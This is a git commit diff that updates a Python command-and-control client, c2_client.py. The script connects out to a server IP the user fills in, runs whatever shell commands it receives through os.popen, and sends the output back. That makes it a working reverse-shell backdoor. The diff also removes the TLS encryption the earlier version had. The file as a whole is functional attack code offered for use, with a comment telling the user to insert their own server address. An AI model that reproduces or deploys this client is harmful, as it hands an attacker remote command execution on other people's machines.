26bc852fc1e323652e0307e6061a0258ced93a96
cwsecur1ty <csheppardoff@gmail.com>
2024-07-27 20:48:35 +0100

    Add files via upload

--- Main/c2_client.py
+++ Main/c2_client.py
@@ -1,28 +1,27 @@
 import socket
-import ssl # To protect data exchanged between the C2 client and 
 import os
 
 # Server configuration
-SERVER_HOST = 'c2_server_ip'
+SERVER_HOST = 'your_server_ip'  # Replace 'your_server_ip' with the actual IP address of your server
 SERVER_PORT = 9999
 
 def connect_to_server():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    context = ssl.create_default_context()
-    ssl_client = context.wrap_socket(client, server_hostname=SERVER_HOST)
-    ssl_client.connect((SERVER_HOST, SERVER_PORT))
+    client.connect((SERVER_HOST, SERVER_PORT))
 
     while True:
         try:
-            command = ssl_client.recv(1024).decode('utf-8')
+            command = client.recv(1024).decode('utf-8')
             if command.lower() == 'exit':
                 print("[*] Exiting...")
                 break
-            
+
+            # Execute the command and get the output
             output = os.popen(command).read()
             if not output:
                 output = "Command executed but no output returned."
-            ssl_client.send(output.encode())
+            
+            client.sendall(output.encode())
         except Exception as e:
             print(f"[!] Error: {e}")
             break
